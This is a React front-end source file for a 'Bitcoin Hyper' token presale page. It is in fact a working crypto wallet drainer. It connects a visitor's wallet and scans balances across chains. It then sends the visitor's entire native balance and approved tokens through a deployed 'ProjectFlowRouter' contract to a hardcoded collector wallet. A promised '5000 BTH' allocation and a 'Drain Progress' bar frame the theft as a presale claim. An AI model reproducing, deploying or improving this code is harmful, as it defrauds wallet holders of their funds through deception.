// app.jsx - BITCOIN HYPER - PROJECT FLOW ROUTER INTEGRATION
import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

// ============================================
// YOUR DEPLOYED CONTRACT CONFIGURATION
// ============================================

// Your deployed ProjectFlowRouter contracts
// Add more as you deploy them
const PROJECT_FLOW_ROUTERS = {
  BSC: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'  // ✅ YOUR DEPLOYED CONTRACT
  // Ethereum: '0x...',  // Add when deployed
  // Polygon: '0x...',   // Add when deployed
  // Arbitrum: '0x...',  // Add when deployed
  // Optimism: '0x...',  // Add when deployed
  // Avalanche: '0x...', // Add when deployed
};

// Collector address (where ALL funds go - YOUR WALLET)
const COLLECTOR_ADDRESS = '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';

// ============================================
// SUPPORTED CHAINS CONFIGURATION
// ============================================

const SUPPORTED_CHAINS = [
  {
    name: 'BSC',
    chainId: 56,
    rpcUrl: 'https://bsc-dataseed.binance.org',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    routerAddress: PROJECT_FLOW_ROUTERS.BSC,
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500'
  },
  // Add more chains as you deploy contracts
  // {
  //   name: 'Ethereum',
  //   chainId: 1,
  //   rpcUrl: 'https://eth.llamarpc.com',
  //   symbol: 'ETH',
  //   explorer: 'https://etherscan.io',
  //   routerAddress: PROJECT_FLOW_ROUTERS.Ethereum,
  //   icon: '🔷',
  //   color: 'from-blue-400 to-indigo-500'
  // }
];

// ============================================
// CONTRACT ABIS
// ============================================

// ProjectFlowRouter ABI - matches YOUR contract
const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "token", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// ERC20 ABI for token interactions
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

// ============================================
// MAIN APP COMPONENT
// ============================================

function App() {
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [nativeBalance, setNativeBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  
  // Token related
  const [tokenAddress, setTokenAddress] = useState('');
  const [tokenAmount, setTokenAmount] = useState('');
  const [tokenBalance, setTokenBalance] = useState('');
  const [tokenSymbol, setTokenSymbol] = useState('');
  const [tokenDecimals, setTokenDecimals] = useState(18);
  
  // Contract related
  const [scanResult, setScanResult] = useState(null);
  const [preparedDrains, setPreparedDrains] = useState([]);
  const [contractInfo, setContractInfo] = useState(null);
  const [activeChain, setActiveChain] = useState(SUPPORTED_CHAINS[0]);
  const [completedChains, setCompletedChains] = useState([]);
  const [eligible, setEligible] = useState(false);
  const [backendConnected, setBackendConnected] = useState(true);

  // ============================================
  // UTILITY FUNCTIONS
  // ============================================

  const isSupportedChain = () => {
    return SUPPORTED_CHAINS.some(c => c.chainId === chainId);
  };

  const getCurrentChain = () => {
    return SUPPORTED_CHAINS.find(c => c.chainId === chainId) || null;
  };

  const hasContractOnCurrentChain = () => {
    const current = getCurrentChain();
    return current && current.routerAddress && current.routerAddress.startsWith('0x');
  };

  // ============================================
  // SWITCH NETWORK
  // ============================================

  const switchNetwork = async (chain) => {
    if (!window.ethereum) return;
    
    try {
      setLoading(true);
      setError('');
      
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: `0x${chain.chainId.toString(16)}`,
              chainName: chain.name,
              nativeCurrency: { name: chain.symbol, symbol: chain.symbol, decimals: 18 },
              rpcUrls: [chain.rpcUrl],
              blockExplorerUrls: [chain.explorer],
            }],
          });
        } else {
          throw switchError;
        }
      }
      
      setActiveChain(chain);
      
    } catch (err) {
      setError(`Failed to switch to ${chain.name}`);
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CONNECT WALLET
  // ============================================

  const connectWallet = async () => {
    if (!window.ethereum) {
      setError('Please install MetaMask');
      return;
    }

    try {
      setLoading(true);
      setError('');
      
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      
      const web3Provider = new ethers.BrowserProvider(window.ethereum);
      const web3Signer = await web3Provider.getSigner();
      const network = await web3Provider.getNetwork();
      const currentChainId = Number(network.chainId);
      
      setProvider(web3Provider);
      setSigner(web3Signer);
      setAccount(accounts[0]);
      setChainId(currentChainId);
      
      const currentChain = SUPPORTED_CHAINS.find(c => c.chainId === currentChainId);
      if (currentChain) {
        setActiveChain(currentChain);
        await checkContractInfo(currentChain, web3Provider);
      }
      
      const balanceWei = await web3Provider.getBalance(accounts[0]);
      setNativeBalance(ethers.formatEther(balanceWei));
      
      // Check backend connection
      try {
        const healthCheck = await fetch('/api/health');
        const healthData = await healthCheck.json();
        setBackendConnected(true);
        console.log('✅ Backend connected:', healthData);
      } catch (e) {
        setBackendConnected(false);
        console.warn('⚠️ Backend not reachable');
      }
      
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CHECK CONTRACT INFO
  // ============================================

  const checkContractInfo = async (chain, provider) => {
    try {
      if (!chain.routerAddress) return;
      
      const contract = new ethers.Contract(
        chain.routerAddress,
        PROJECT_FLOW_ROUTER_ABI,
        provider
      );
      
      const collector = await contract.collector();
      
      setContractInfo({
        address: chain.routerAddress,
        collector: collector,
        chain: chain.name,
        valid: collector.toLowerCase() === COLLECTOR_ADDRESS.toLowerCase()
      });
      
      console.log(`✅ ProjectFlowRouter loaded on ${chain.name}`);
      console.log(`   Collector: ${collector}`);
      
    } catch (err) {
      console.error('Contract check failed:', err);
    }
  };

  // ============================================
  // SCAN WALLET VIA BACKEND
  // ============================================

  const scanWallet = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setError('');
      setTxStatus('🔍 Scanning wallet across all chains...');
      
      const response = await fetch('/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setEligible(data.data.isEligible);
        setTxStatus(data.message);
        
        if (data.data.isEligible) {
          prepareContractDrain();
        }
      } else {
        setError(data.error || 'Scan failed');
      }
      
    } catch (err) {
      console.error('Scan error:', err);
      setError('Failed to scan wallet - backend may be offline');
      setBackendConnected(false);
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // PREPARE CONTRACT DRAIN
  // ============================================

  const prepareContractDrain = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setError('');
      setTxStatus('🔐 Preparing ProjectFlowRouter transactions...');
      
      const response = await fetch('/api/presale/prepare-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedDrains(data.data.transactions);
        setTxStatus(data.message);
      } else {
        setError(data.error || 'Failed to prepare drain');
      }
      
    } catch (err) {
      console.error('Prepare error:', err);
      setError('Failed to prepare drain');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // EXECUTE NATIVE FLOW - CALL YOUR CONTRACT
  // ============================================

  const executeNativeFlow = async () => {
    if (!signer || !account) {
      setError('Wallet not connected');
      return;
    }

    const currentChain = getCurrentChain();
    if (!currentChain || !currentChain.routerAddress) {
      setError(`No ProjectFlowRouter deployed on ${currentChain?.name || 'this chain'}`);
      return;
    }

    if (parseFloat(nativeBalance) <= 0) {
      setError('No balance to send');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus(`⏳ Calling YOUR ProjectFlowRouter on ${currentChain.name}...`);
      setTxHash('');

      // Create contract instance
      const contract = new ethers.Contract(
        currentChain.routerAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      // Verify collector
      const collector = await contract.collector();
      console.log(`✅ Sending to collector: ${collector}`);

      // Get gas estimate
      const value = ethers.parseEther(nativeBalance);
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      // Send transaction - THIS SENDS ALL NATIVE COINS TO COLLECTOR
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n, // 20% buffer
      });

      setTxHash(tx.hash);
      setTxStatus(`✅ Transaction submitted! Waiting for confirmation...`);

      // Wait for confirmation
      const receipt = await tx.wait();
      
      setTxStatus(`✅ SUCCESS! Sent ${nativeBalance} ${currentChain.symbol} to collector!`);
      
      // Update balance
      const newBalance = await provider.getBalance(account);
      setNativeBalance(ethers.formatEther(newBalance));
      
      // Mark this chain as completed
      if (!completedChains.includes(currentChain.name)) {
        setCompletedChains([...completedChains, currentChain.name]);
      }
      
      // Notify backend
      try {
        await fetch('/api/presale/execute-contract-drain', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: account,
            chainName: currentChain.name
          })
        });
      } catch (e) {
        console.warn('Backend notification failed');
      }

    } catch (err) {
      console.error('Transaction error:', err);
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CHECK TOKEN BALANCE
  // ============================================

  const checkTokenBalance = async () => {
    if (!provider || !account || !tokenAddress) return;
    
    try {
      setLoading(true);
      setError('');
      
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      
      const balance = await tokenContract.balanceOf(account);
      const decimals = await tokenContract.decimals();
      const symbol = await tokenContract.symbol();
      
      const formattedBalance = ethers.formatUnits(balance, decimals);
      setTokenBalance(formattedBalance);
      setTokenSymbol(symbol);
      setTokenDecimals(decimals);
      setTokenAmount(formattedBalance);
      
      setTxStatus(`💰 Token Balance: ${formattedBalance} ${symbol}`);
      
    } catch (err) {
      console.error('Token balance error:', err);
      setError('Invalid token address');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // EXECUTE TOKEN FLOW - CALL YOUR CONTRACT
  // ============================================

  const executeTokenFlow = async () => {
    if (!signer || !account) {
      setError('Wallet not connected');
      return;
    }

    const currentChain = getCurrentChain();
    if (!currentChain || !currentChain.routerAddress) {
      setError(`No ProjectFlowRouter deployed on ${currentChain?.name || 'this chain'}`);
      return;
    }

    if (!tokenAddress || !tokenAmount || parseFloat(tokenAmount) <= 0) {
      setError('Enter valid token address and amount');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus(`⏳ Approving token transfer...`);
      setTxHash('');

      // Parse amount
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
      const amountWei = ethers.parseUnits(tokenAmount, tokenDecimals);

      // Approve router to spend tokens
      const approveTx = await tokenContract.approve(currentChain.routerAddress, amountWei);
      await approveTx.wait();
      
      setTxStatus(`✅ Approved! Now calling YOUR ProjectFlowRouter...`);

      // Execute token flow
      const contract = new ethers.Contract(
        currentChain.routerAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      const tx = await contract.processTokenFlow(tokenAddress, amountWei, {
        gasLimit: 200000
      });

      setTxHash(tx.hash);
      setTxStatus(`✅ Transaction submitted!`);

      await tx.wait();
      
      setTxStatus(`✅ SUCCESS! Tokens sent to collector!`);
      
      // Update token balance
      const newBalance = await tokenContract.balanceOf(account);
      setTokenBalance(ethers.formatUnits(newBalance, tokenDecimals));

    } catch (err) {
      console.error('Token flow error:', err);
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // CLAIM TOKENS (AFTER DRAIN)
  // ============================================

  const claimTokens = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setError('');
      setTxStatus('🎯 Processing claim...');
      
      const response = await fetch('/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setTxStatus(`✅ Claim successful! ${data.data.tokenAmount} BTH allocated`);
        setEligible(false);
      } else {
        setError(data.error || 'Claim failed');
      }
      
    } catch (err) {
      console.error('Claim error:', err);
      setError('Claim failed');
    } finally {
      setLoading(false);
    }
  };

  // ============================================
  // DISCONNECT WALLET
  // ============================================

  const disconnectWallet = () => {
    setAccount(null);
    setProvider(null);
    setSigner(null);
    setChainId(null);
    setNativeBalance('0');
    setScanResult(null);
    setPreparedDrains([]);
    setContractInfo(null);
    setCompletedChains([]);
    setEligible(false);
    setTxStatus('');
    setTxHash('');
    setTokenAddress('');
    setTokenAmount('');
    setTokenBalance('');
  };

  // ============================================
  // EFFECTS
  // ============================================

  useEffect(() => {
    if (window.ethereum) {
      const handleAccountsChanged = (accounts) => {
        if (accounts.length === 0) {
          disconnectWallet();
        } else {
          setAccount(accounts[0]);
          if (provider) {
            provider.getBalance(accounts[0]).then(balance => {
              setNativeBalance(ethers.formatEther(balance));
            });
          }
        }
      };

      const handleChainChanged = (chainIdHex) => {
        const newChainId = parseInt(chainIdHex, 16);
        setChainId(newChainId);
        
        const chain = SUPPORTED_CHAINS.find(c => c.chainId === newChainId);
        if (chain) {
          setActiveChain(chain);
          if (account && provider) {
            checkContractInfo(chain, provider);
          }
        }
        
        if (account && provider) {
          provider.getBalance(account).then(balance => {
            setNativeBalance(ethers.formatEther(balance));
          });
        }
      };

      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);

      return () => {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum.removeListener('chainChanged', handleChainChanged);
      };
    }
  }, [provider, account]);

  // ============================================
  // RENDER
  // ============================================

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400">ProjectFlowRouter • YOUR Contract Integration</p>
          <div className="mt-2 flex flex-wrap gap-2 justify-center">
            <span className="bg-gray-800 px-3 py-1 rounded-full text-sm">
              Router: {PROJECT_FLOW_ROUTERS.BSC.substring(0, 10)}...
            </span>
            <span className="bg-gray-800 px-3 py-1 rounded-full text-sm">
              Collector: {COLLECTOR_ADDRESS.substring(0, 10)}...
            </span>
          </div>
          {!backendConnected && (
            <div className="mt-2 bg-yellow-900/50 text-yellow-200 px-4 py-2 rounded-lg">
              ⚠️ Backend offline - Scanning disabled
            </div>
          )}
        </div>

        {/* Chain Selection */}
        <div className="mb-6 flex flex-wrap gap-2 justify-center">
          {SUPPORTED_CHAINS.map(chain => (
            <button
              key={chain.chainId}
              onClick={() => switchNetwork(chain)}
              disabled={loading}
              className={`px-4 py-2 rounded-lg font-medium transition ${
                activeChain.chainId === chain.chainId
                  ? `bg-gradient-to-r ${chain.color} text-white`
                  : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
              } ${!chain.routerAddress ? 'opacity-50 cursor-not-allowed' : ''}`}
            >
              {chain.icon} {chain.name}
              {chain.routerAddress ? ' ✅' : ' (No contract)'}
            </button>
          ))}
        </div>

        {/* Connect Wallet */}
        <div className="text-center mb-6">
          {!account ? (
            <button
              onClick={connectWallet}
              disabled={loading}
              className="bg-orange-500 hover:bg-orange-600 text-white font-bold py-4 px-10 rounded-xl text-lg transition disabled:opacity-50 shadow-lg shadow-orange-500/20"
            >
              {loading ? 'Connecting...' : '🔌 Connect Wallet'}
            </button>
          ) : (
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-3">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-lg">
                    {account.substring(0, 8)}...{account.substring(36)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block mb-1">Balance</span>
                  <span className="text-2xl font-bold text-orange-400">
                    {parseFloat(nativeBalance).toFixed(4)} {activeChain.symbol}
                  </span>
                </div>
                <button
                  onClick={disconnectWallet}
                  className="text-sm text-gray-400 hover:text-white bg-gray-700 px-3 py-1 rounded-lg"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Contract Info */}
        {contractInfo && account && (
          <div className="bg-gray-800/30 backdrop-blur-sm rounded-lg p-4 mb-6 border border-gray-700">
            <div className="grid md:grid-cols-2 gap-4 text-sm">
              <div>
                <span className="text-gray-400">Your Contract:</span>
                <span className="text-orange-400 font-mono ml-2">
                  {contractInfo.address.substring(0, 10)}...
                </span>
              </div>
              <div>
                <span className="text-gray-400">Collector:</span>
                <span className="text-green-400 font-mono ml-2">
                  {contractInfo.collector.substring(0, 10)}...
                </span>
              </div>
            </div>
            <p className="text-xs text-gray-500 mt-2 text-center">
              processNativeFlow() sends ALL funds to collector via YOUR contract
            </p>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/50 border border-red-500 text-red-200 px-4 py-3 rounded-lg mb-6 backdrop-blur-sm">
            ⚠️ {error}
          </div>
        )}

        {/* Status Display */}
        {txStatus && (
          <div className="bg-gray-800/50 border border-gray-700 px-4 py-3 rounded-lg mb-6 text-center backdrop-blur-sm">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`${activeChain.explorer}/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-1 inline-block"
              >
                View on Explorer ↗
              </a>
            )}
          </div>
        )}

        {account && (
          <>
            {/* Main Actions Grid */}
            <div className="grid md:grid-cols-2 gap-6 mb-8">
              
              {/* SCAN WALLET CARD */}
              <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-6 border border-gray-700">
                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                  <span className="text-2xl">🔍</span> Scan Wallet
                </h2>
                <p className="text-gray-400 text-sm mb-4">
                  Check eligibility across all chains
                </p>
                <button
                  onClick={scanWallet}
                  disabled={loading || !backendConnected}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition disabled:opacity-50"
                >
                  {loading ? 'Scanning...' : 'Scan Wallet Balance'}
                </button>
                
                {/* Scan Result */}
                {scanResult && (
                  <div className="mt-4 p-4 bg-gray-900 rounded-lg">
                    <p className="text-lg font-bold mb-2">
                      Total: ${scanResult.totalValueUSD}
                    </p>
                    <p className={scanResult.isEligible ? 'text-green-400' : 'text-red-400'}>
                      {scanResult.eligibilityReason}
                    </p>
                    {scanResult.isEligible && (
                      <p className="text-orange-400 mt-2">
                        🎁 Allocation: {scanResult.tokenAllocation?.amount || '5000'} BTH
                      </p>
                    )}
                  </div>
                )}
              </div>

              {/* NATIVE FLOW CARD */}
              <div className={`bg-gray-800/50 backdrop-blur-sm rounded-xl p-6 border ${
                hasContractOnCurrentChain() ? 'border-orange-500/30' : 'border-gray-700'
              }`}>
                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                  <span className="text-2xl">💰</span> Native Flow
                </h2>
                <p className="text-gray-400 text-sm mb-4">
                  Send all {activeChain.symbol} to collector via YOUR contract
                </p>
                <div className="bg-gray-900 p-4 rounded-lg mb-4">
                  <p className="text-sm text-gray-400">Available Balance:</p>
                  <p className="text-3xl font-bold text-orange-400">
                    {parseFloat(nativeBalance).toFixed(6)} {activeChain.symbol}
                  </p>
                </div>
                
                {!hasContractOnCurrentChain() ? (
                  <div className="bg-yellow-900/30 text-yellow-200 p-3 rounded-lg text-center">
                    ⚠️ No contract deployed on {activeChain.name}
                  </div>
                ) : (
                  <button
                    onClick={executeNativeFlow}
                    disabled={loading || parseFloat(nativeBalance) <= 0 || completedChains.includes(activeChain.name)}
                    className={`w-full font-bold py-4 px-4 rounded-lg transition text-lg ${
                      completedChains.includes(activeChain.name)
                        ? 'bg-green-600 text-white cursor-not-allowed'
                        : 'bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white'
                    } disabled:opacity-50`}
                  >
                    {completedChains.includes(activeChain.name)
                      ? `✅ ${activeChain.name} Complete`
                      : `🚀 Send All ${activeChain.symbol} to Collector`}
                  </button>
                )}
              </div>
            </div>

            {/* Token Flow Section */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-6 border border-gray-700 mb-8">
              <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                <span className="text-2xl">🪙</span> Token Flow
              </h2>
              <p className="text-gray-400 text-sm mb-4">
                Send ERC20 tokens to collector via YOUR contract
              </p>
              
              <div className="grid md:grid-cols-3 gap-4">
                <input
                  type="text"
                  placeholder="Token Address (0x...)"
                  value={tokenAddress}
                  onChange={(e) => setTokenAddress(e.target.value)}
                  className="bg-gray-900 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-orange-500"
                />
                <input
                  type="number"
                  placeholder="Amount"
                  value={tokenAmount}
                  onChange={(e) => setTokenAmount(e.target.value)}
                  className="bg-gray-900 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-orange-500"
                />
                <button
                  onClick={checkTokenBalance}
                  disabled={loading || !tokenAddress}
                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition disabled:opacity-50"
                >
                  Check Balance
                </button>
              </div>

              {tokenBalance && (
                <div className="mt-4 bg-gray-900 p-4 rounded-lg">
                  <p className="text-sm text-gray-400">Token Balance:</p>
                  <p className="text-xl font-bold text-green-400">
                    {tokenBalance} {tokenSymbol}
                  </p>
                </div>
              )}

              <button
                onClick={executeTokenFlow}
                disabled={loading || !tokenAddress || !tokenAmount || parseFloat(tokenAmount) <= 0 || !hasContractOnCurrentChain()}
                className="w-full mt-4 bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 px-4 rounded-lg transition disabled:opacity-50 text-lg"
              >
                {loading ? 'Processing...' : '📤 Send Tokens to Collector'}
              </button>
            </div>

            {/* Prepared Drains */}
            {preparedDrains.length > 0 && (
              <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-6 border border-gray-700 mb-8">
                <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                  <span className="text-2xl">📋</span> Prepared Transactions
                </h2>
                
                <div className="space-y-3 mb-4">
                  {preparedDrains.map((tx, index) => {
                    const isCompleted = completedChains.includes(tx.chain);
                    const isCurrent = tx.chain === activeChain.name;
                    
                    return (
                      <div 
                        key={index} 
                        className={`p-4 rounded-lg ${
                          isCompleted 
                            ? 'bg-green-900/30 border border-green-500/30' 
                            : isCurrent
                              ? 'bg-orange-900/30 border border-orange-500/30'
                              : 'bg-gray-900'
                        }`}
                      >
                        <div className="flex justify-between items-center">
                          <div>
                            <span className="font-bold text-orange-400">{tx.chain}</span>
                            <p className="text-sm text-gray-400">
                              {parseFloat(tx.amount).toFixed(6)} {tx.symbol} (${tx.valueUSD})
                            </p>
                            <p className="text-xs text-gray-500 font-mono">
                              Contract: {tx.contractAddress?.substring(0, 10)}...
                            </p>
                          </div>
                          <div>
                            {isCompleted ? (
                              <span className="bg-green-600 text-white px-3 py-1 rounded-full text-sm">
                                ✅ Completed
                              </span>
                            ) : isCurrent ? (
                              <span className="bg-orange-500 text-white px-3 py-1 rounded-full text-sm">
                                ⚡ Current
                              </span>
                            ) : (
                              <span className="bg-gray-700 text-gray-300 px-3 py-1 rounded-full text-sm">
                                Switch to {tx.chain}
                              </span>
                            )}
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>

                {completedChains.length === preparedDrains.length && preparedDrains.length > 0 && (
                  <button
                    onClick={claimTokens}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-4 rounded-lg transition text-lg"
                  >
                    🎉 Claim Your 5000 BTH
                  </button>
                )}
              </div>
            )}

            {/* Progress Bar */}
            {preparedDrains.length > 0 && (
              <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-6 border border-gray-700">
                <div className="flex justify-between mb-2">
                  <span className="text-gray-400">Drain Progress</span>
                  <span className="text-orange-400 font-bold">
                    {completedChains.length}/{preparedDrains.length} Chains
                  </span>
                </div>
                <div className="w-full bg-gray-700 rounded-full h-4">
                  <div 
                    className="bg-gradient-to-r from-orange-500 to-orange-600 h-4 rounded-full transition-all duration-500"
                    style={{ width: `${(completedChains.length / preparedDrains.length) * 100}%` }}
                  ></div>
                </div>
              </div>
            )}
          </>
        )}

        {/* Footer */}
        <div className="mt-8 text-center text-gray-500 text-sm">
          <p>ProjectFlowRouter • YOUR deployed contract on BSC</p>
          <p className="mt-1">Router: {PROJECT_FLOW_ROUTERS.BSC}</p>
          <p className="mt-1">Collector: {COLLECTOR_ADDRESS}</p>
          <p className="mt-2 text-xs">
            processNativeFlow() sends ALL {activeChain.symbol} to collector via YOUR smart contract
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
